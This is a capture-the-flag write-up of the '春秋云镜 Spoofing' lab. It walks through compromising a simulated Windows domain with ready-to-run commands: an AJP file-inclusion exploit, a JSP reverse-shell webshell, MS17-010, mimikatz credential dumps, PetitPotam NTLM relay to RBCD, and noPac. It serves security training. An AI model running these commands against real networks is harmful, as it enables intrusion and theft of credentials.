---
title: "春秋云镜 Spoofing Writeup"
date: 2023-08-16T14:09:35+08:00
lastmod: 2023-08-16T14:09:35+08:00
draft: false
author: "X1r0z"

tags: ['ntlm', 'keberos', 'windows']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

春秋云镜 Spoofing Writeup

<!--more-->

## flag01

fscan

```shell
$ fscan ./fscan_darwin_arm64 -h 39.98.127.74

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 39.98.127.74    is alive
[*] Icmp alive hosts len is: 1
39.98.127.74:8080 open
39.98.127.74:22 open
39.98.127.74:8009 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle: http://39.98.127.74:8080  code:200 len:7091   title:后台管理
已完成 3/3
[*] 扫描结束,耗时: 37.516303333s
```

8080 端口

![image-20230816112557021](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161125058.png)

主页只是个 html, 没有功能, 于是 dirsearch

```shell
$ dirsearch -u "http://39.98.127.74:8080/"

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /Users/exp10it/reports/http_39.98.127.74_8080/__23-08-16_11-25-13.txt

Target: http://39.98.127.74:8080/

[11:25:13] Starting:
[11:25:14] 302 -    0B  - /js  ->  /js/
[11:25:17] 200 -  114B  - /404.html
[11:25:17] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[11:25:18] 400 -  795B  - /a%5c.aspx
[11:25:27] 302 -    0B  - /css  ->  /css/
[11:25:27] 302 -    0B  - /data  ->  /data/
[11:25:28] 404 -  733B  - /docs/export-demo.xml
[11:25:28] 404 -  732B  - /docs/CHANGELOG.html
[11:25:28] 404 -  749B  - /docs/html/admin/ch03s07.html
[11:25:28] 404 -  729B  - /docs/_build/
[11:25:28] 404 -  731B  - /docs/changelog.txt
[11:25:28] 404 -  750B  - /docs/html/developer/ch02.html
[11:25:28] 404 -  747B  - /docs/html/admin/index.html
[11:25:28] 404 -  749B  - /docs/html/admin/ch01s04.html
[11:25:28] 404 -  753B  - /docs/html/developer/ch03s15.html
[11:25:28] 404 -  746B  - /docs/html/admin/ch01.html
[11:25:28] 302 -    0B  - /docs  ->  /docs/
[11:25:28] 404 -  737B  - /docs/html/index.html
[11:25:28] 404 -  730B  - /docs/updating.txt
[11:25:28] 404 -  733B  - /docs/maintenance.txt
[11:25:28] 404 -  730B  - /docs/swagger.json
[11:25:28] 200 -   17KB - /docs/
[11:25:28] 302 -    0B  - /download  ->  /download/
[11:25:28] 200 -  132B  - /download/
[11:25:29] 404 -  781B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[11:25:29] 404 -  746B  - /examples/servlet/SnoopServlet
[11:25:29] 200 -    1KB - /examples/websocket/index.xhtml
[11:25:29] 200 -    1KB - /examples/servlets/servlet/RequestHeaderExample
[11:25:29] 302 -    0B  - /examples  ->  /examples/
[11:25:29] 200 -  658B  - /examples/servlets/servlet/CookieExample
[11:25:29] 200 -    6KB - /examples/servlets/index.html
[11:25:29] 200 -    1KB - /examples/
[11:25:29] 200 -   14KB - /examples/jsp/index.html
[11:25:29] 200 -  686B  - /examples/jsp/snp/snoop.jsp
[11:25:30] 403 -    3KB - /host-manager/
[11:25:30] 403 -    3KB - /host-manager/html
[11:25:32] 302 -    0B  - /images  ->  /images/
[11:25:33] 302 -    0B  - /lib  ->  /lib/
[11:25:34] 302 -    0B  - /manager  ->  /manager/
[11:25:34] 403 -    3KB - /manager/
[11:25:34] 403 -    3KB - /manager/html
[11:25:34] 403 -    3KB - /manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY
[11:25:34] 403 -    3KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=
[11:25:34] 403 -    3KB - /manager/html/
[11:25:34] 403 -    3KB - /manager/jmxproxy/?get=java.lang:type=Memory&att=HeapMemoryUsage
[11:25:34] 403 -    3KB - /manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS
[11:25:34] 403 -    3KB - /manager/jmxproxy
[11:25:34] 403 -    3KB - /manager/VERSION
[11:25:34] 403 -    3KB - /manager/status/all
[11:25:34] 403 -    3KB - /manager/login.asp
[11:25:34] 403 -    3KB - /manager/login
[11:25:34] 403 -    3KB - /manager/jmxproxy/?qry=STUFF
[11:25:34] 403 -    3KB - /manager/admin.asp
[11:25:34] 403 -    3KB - /manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE
[11:25:46] 403 -    0B  - /upload/
[11:25:46] 403 -    0B  - /upload/2.php
[11:25:46] 403 -    0B  - /upload/1.php
[11:25:46] 403 -    0B  - /upload
[11:25:46] 403 -    0B  - /upload/loginIxje.php
[11:25:46] 403 -    0B  - /upload/b_user.csv
[11:25:46] 403 -    0B  - /upload/b_user.xls
[11:25:46] 403 -    0B  - /upload/upload.php
[11:25:46] 403 -    0B  - /upload/test.txt
[11:25:46] 403 -    0B  - /upload/test.php
[11:25:46] 200 -    9KB - /user.html
```

查看 /docs 发现是 `Apache Tomcat Version 9.0.30, Dec 7 2019`, 一眼 CVE-2020-1938 AJP 文件包含

[https://github.com/hypn0s/AJPy](https://github.com/hypn0s/AJPy)

```shell
python3 tomcat.py read_file --webapp=ROOT /WEB-INF/web.xml 39.98.127.74
```

web.xml

```xml
<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app>
  <display-name>Archetype Created Web Application</display-name>

  <security-constraint>
    <display-name>Tomcat Server Configuration Security Constraint</display-name>
    <web-resource-collection>
      <web-resource-name>Protected Area</web-resource-name>
      <url-pattern>/upload/*</url-pattern>
    </web-resource-collection>
    <auth-constraint>
      <role-name>admin</role-name>
    </auth-constraint>
  </security-constraint>

  <error-page>
    <error-code>404</error-code>
    <location>/404.html</location>
  </error-page>

  <error-page>
    <error-code>403</error-code>
    <location>/error.html</location>
  </error-page>

  <error-page>
    <exception-type>java.lang.Throwable</exception-type>
    <location>/error.html</location>
  </error-page>

  <servlet>
    <servlet-name>HelloServlet</servlet-name>
    <servlet-class>com.example.HelloServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>HelloServlet</servlet-name>
    <url-pattern>/HelloServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>LoginServlet</display-name>
    <servlet-name>LoginServlet</servlet-name>
    <servlet-class>com.example.LoginServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>LoginServlet</servlet-name>
    <url-pattern>/LoginServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>RegisterServlet</display-name>
    <servlet-name>RegisterServlet</servlet-name>
    <servlet-class>com.example.RegisterServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>RegisterServlet</servlet-name>
    <url-pattern>/RegisterServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>UploadTestServlet</display-name>
    <servlet-name>UploadTestServlet</servlet-name>
    <servlet-class>com.example.UploadTestServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>UploadTestServlet</servlet-name>
    <url-pattern>/UploadServlet</url-pattern>
  </servlet-mapping>

  <servlet>
    <display-name>DownloadFileServlet</display-name>
    <servlet-name>DownloadFileServlet</servlet-name>
    <servlet-class>com.example.DownloadFileServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>DownloadFileServlet</servlet-name>
    <url-pattern>/DownloadServlet</url-pattern>
  </servlet-mapping>
</web-app>
```

http://39.98.127.74:8080/UploadServlet

![image-20230816114245945](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161142978.png)

结合文件包含实现 RCE

```jsp
<%
    java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,[REDACTED]}|{base64,-d}|{bash,-i}").getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print("</pre>");
%>
```

include

```shell
python3 tomcat.py read_file --webapp=ROOT upload/657fee58191da93589dcd31f38fd1b5b/20230816122910173.txt 39.99.156.24
```

![image-20230816122958289](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161229322.png)

flag01

![image-20230816123037121](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161230155.png)

## flag02

内网信息

```shell
root@ubuntu:/tmp# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.11.76  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe21:d526  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:21:d5:26  txqueuelen 1000  (Ethernet)
        RX packets 62357  bytes 82200796 (82.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 21831  bytes 2557039 (2.5 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 680  bytes 58143 (58.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 680  bytes 58143 (58.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

fscan

```shell
root@ubuntu:/tmp# ./fscan -h 172.22.11.0/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
(icmp) Target 172.22.11.6     is alive
(icmp) Target 172.22.11.26    is alive
(icmp) Target 172.22.11.76    is alive
(icmp) Target 172.22.11.45    is alive
[*] Icmp alive hosts len is: 4
172.22.11.26:7680 open
172.22.11.76:8080 open
172.22.11.45:445 open
172.22.11.26:445 open
172.22.11.6:445 open
172.22.11.45:139 open
172.22.11.26:139 open
172.22.11.6:139 open
172.22.11.45:135 open
172.22.11.26:135 open
172.22.11.6:135 open
172.22.11.76:22 open
172.22.11.76:8009 open
172.22.11.6:88 open
[*] alive ports len is: 14
start vulscan
[*] NetInfo:
[*]172.22.11.26
   [->]XR-LCM3AE8B
   [->]172.22.11.26
[*] NetInfo:
[*]172.22.11.6
   [->]XIAORANG-DC
   [->]172.22.11.6
[*] NetBios: 172.22.11.6     [+] DC:XIAORANG\XIAORANG-DC
[+] 172.22.11.45	MS17-010	(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
[*] NetBios: 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server 2008 R2 Enterprise 7601 Service Pack 1
[*] NetBios: 172.22.11.26    XIAORANG\XR-LCM3AE8B
[*] WebTitle: http://172.22.11.76:8080  code:200 len:7091   title:后台管理
已完成 14/14
[*] 扫描结束,耗时: 7.723476978s
```

整理信息

```shell
172.22.11.6 XIAORANG-DC DC
172.22.11.26 XR-LCM3AE8B
172.22.11.76 本机
172.22.11.45 MS17-010 XR-DESKTOP
```

proxychains + msf 打 ms17-010 (用 msf 自带的路由功能会打不了)

![image-20230816124612016](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161246050.png)

mimikatz

```shell
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username     Domain    NTLM                              SHA1
--------     ------    ----                              ----
XR-DESKTOP$  XIAORANG  03e8d17f4da1797f6b69a9a7a23244c1  1d70088a085b3d3d5bafd48def14478a9bc0d8fb
yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f

wdigest credentials
===================

Username     Domain    Password
--------     ------    --------
(null)       (null)    (null)
XR-DESKTOP$  XIAORANG  ...... (略)
                       91 ca 9f cc f8
yangmei      XIAORANG  xrihGHgoNZQ

kerberos credentials
====================

Username     Domain        Password
--------     ------        --------
(null)       (null)        (null)
xr-desktop$  XIAORANG.LAB  ...... (略)
xr-desktop$  XIAORANG.LAB  (null)
yangmei      XIAORANG.LAB  xrihGHgoNZQ

```

flag02

```shell
meterpreter > pwd
C:\Users\Administrator\flag
meterpreter > cat flag02.txt
                                                      ##
  :####:                                   :####      ##
 :######                                   #####      ##
 ##:  :#                                   ##
 ##        ##.###:    .####.    .####.   #######    ####     ##.####    :###:##
 ###:      #######:  .######.  .######.  #######    ####     #######   .#######
 :#####:   ###  ###  ###  ###  ###  ###    ##         ##     ###  :##  ###  ###
  .#####:  ##.  .##  ##.  .##  ##.  .##    ##         ##     ##    ##  ##.  .##
     :###  ##    ##  ##    ##  ##    ##    ##         ##     ##    ##  ##    ##
       ##  ##.  .##  ##.  .##  ##.  .##    ##         ##     ##    ##  ##.  .##
 #:.  :##  ###  ###  ###  ###  ###  ###    ##         ##     ##    ##  ###  ###
 #######:  #######:  .######.  .######.    ##      ########  ##    ##  .#######
 .#####:   ##.###:    .####.    .####.     ##      ########  ##    ##   :###:##
           ##                                                           #.  :##
           ##                                                           ######
           ##                                                           :####:


flag02: [REDACTED]
```

## flag03

域用户凭据

```shell
yangmei:xrihGHgoNZQ
```

根据题目描述, 考虑 NTLM Relay via WebDAV

检测内网启动了 WebClient 服务的机器

![image-20230816125859701](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161258750.png)

PetitPotam

![image-20230816130032840](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161300887.png)

使用 addcomputer.py 创建机器账户的时候提示如下

```shell
[-] User yangmei machine quota exceeded!
```

查询后发现 `MAQ=0`, 但是上面 mimikatz 已经导出了 `XR_DESKTOP$` 账户的 Hash, 所以用这个机器账户配置 RBCD 就行

先启动 ntlmrelayx.py

```shell
proxychains ntlmrelayx.py -t ldap://172.22.11.6 --escalate-user 'XR-DESKTOP$' --delegate-access --no-dump
```

> 默认情况下, WebClient 仅对本地内部网 (Local Intranet) 或受信任的站点 (Trusted Sites) 列表中的目标自动使用当前用户凭据进行 NTLM 认证

添加 DNS 信息

```shell
$ proxychains bloodyAD -d xiaorang.lab -u yangmei -p xrihGHgoNZQ --host 172.22.11.6 add dnsR
ecord evil 172.22.11.76
[+] evil has been successfully added
```

ssh 远程端口转发

```shell
ssh root@39.99.156.24 -D 1080 -R 81:127.0.0.1:80
```

但因为默认情况下远程端口转发只监听本地地址, 所以要么修改 sshd config 要么用端口转发工具中转一下

```shell
root@ubuntu:~# netstat -ntpl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      435/systemd-resolve
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      622/sshd: /usr/sbin
tcp        0      0 127.0.0.1:81            0.0.0.0:*               LISTEN      2955/sshd: root@pts
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      639/java
tcp6       0      0 :::8009                 :::*                    LISTEN      639/java
tcp6       0      0 :::8080                 :::*                    LISTEN      639/java
root@u
```

用 iox 将来自 `0.0.0.0:80` 的流量转发至 `127.0.0.1:81`

```shell
root@ubuntu:/tmp# ./iox fwd -l 80 -r 127.0.0.1:81
[*] Forward TCP traffic between 0.0.0.0:80 (encrypted: false) and 127.0.0.1:81 (encrypted: false
```

PetitPotam

![image-20230816131725997](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161317053.png)

ntlmrelayx

![image-20230816131744852](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161317906.png)

申请 ST

```shell
proxychains getST.py xiaorang.lab/'XR-DESKTOP$' -hashes ':03e8d17f4da1797f6b69a9a7a23244c1' -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate Administrator -dc-ip 172.22.11.6
```

psexec

```shell
proxychains psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -dc-ip 172.22.11.6 -codec gbk
```

![image-20230816132121161](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161321219.png)

flag03

![image-20230816132148925](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161321984.png)

## flag04

mimikatz

```shell
sekurlsa::logonpasswords
mimikatz #
Authentication Id : 0 ; 744772 (00000000:000b5d44)
Session           : RemoteInteractive from 2
User Name         : zhanghui
Domain            : XIAORANG
Logon Server      : XIAORANG-DC
Logon Time        : 2023/8/16 12:27:42
SID               : S-1-5-21-3598443049-773813974-2432140268-1133
	msv :
	 [00000003] Primary
	 * Username : zhanghui
	 * Domain   : XIAORANG
	 * NTLM     : 1232126b24cdf8c9bd2f788a9d7c7ed1
	 * SHA1     : f3b66ff457185cdf5df6d0a085dd8935e226ba65
	 * DPAPI    : 4bfe751ae03dc1517cfb688adc506154
	tspkg :
	wdigest :
	 * Username : zhanghui
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :
	 * Username : zhanghui
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :
	credman :
	cloudap :

Authentication Id : 0 ; 707863 (00000000:000acd17)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/8/16 12:27:41
SID               : S-1-5-90-0-2
	msv :
	 [00000003] Primary
	 * Username : XR-LCM3AE8B$
	 * Domain   : XIAORANG
	 * NTLM     : f87bbea221c346a6578b5e937f207038
	 * SHA1     : 318380b6fdd4556d540909a5c86a1bf191b2f0f5
	tspkg :
	wdigest :
	 * Username : XR-LCM3AE8B$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :
	 * Username : XR-LCM3AE8B$
	 * Domain   : xiaorang.lab
	 ......
```

根据题目描述考虑 noPac

试了一会发现只有 zhanghui 用户能打通 (?)

```shell
proxychains python3 noPac.py xiaorang.lab/zhanghui -hashes ':1232126b24cdf8c9bd2f788a9d7c7ed1' -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell
```

![image-20230816134513388](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161345451.png)

flag04

![image-20230816134601736](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161346804.png)

后来看了下网上的 writeup

[https://www.cnblogs.com/backlion/p/17187375.html](https://www.cnblogs.com/backlion/p/17187375.html)

意思是 `MA_Admin` 组对 Computer 容器才有 CreateChild 权限, 也就是能向域中添加机器账户

![image-20230816134118086](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161341153.png)

![image-20230816134137154](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308161341217.png)

当然可以直接利用之前的 `XR-DESKTOP$` 机器账户来打 noPac

```shell
proxychains python3 noPac.py xiaorang.lab/'XR-DESKTOP$' -hashes ':03e8d17f4da1797f6b69a9a7a23244c1' -dc-ip 172.22.11.6 --impersonate Administrator -no-add -target-name 'XR-DESKTOP$' -old-hash ':03e8d17f4da1797f6b69a9a7a23244c1' -use-ldap -shell
```

